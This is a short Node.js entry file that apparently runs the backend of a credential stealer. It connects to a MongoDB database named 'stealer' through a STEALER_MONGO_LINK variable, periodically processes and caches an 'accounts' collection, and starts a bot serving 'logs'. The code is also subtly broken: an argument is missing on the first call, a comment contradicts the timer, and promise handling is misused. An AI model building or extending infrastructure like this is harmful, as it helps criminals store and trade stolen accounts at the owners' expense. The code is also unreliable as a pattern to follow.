const { db_administration } = require('./db/updater');
const { start_bot } = require('./bot/bot');
const { cache } = require('./bot/cacher');
const MongoClient = require("mongodb").MongoClient;

const client = new MongoClient(
    process.env.STEALER_MONGO_LINK,
    { useUnifiedTopology: true },
);

const db_procces = async (accounts) => {
    db_administration(accounts)
        .then(console.log('administrating db'));
    cache(accounts)
        .then(console.log('caching local db'));
};

const main = async () => {
    await client.connect();

    const page_size = 2; //from 0

    const db = client.db("stealer");
    let accounts = db.collection("accounts");
    let logs = db.collection("logs");
    //first run
    db_procces();
    
    setInterval( //nexts
        db_procces,
        1000 * 60 * 1, //30 min
        accounts
    );

    
    start_bot(logs, page_size);
}

main();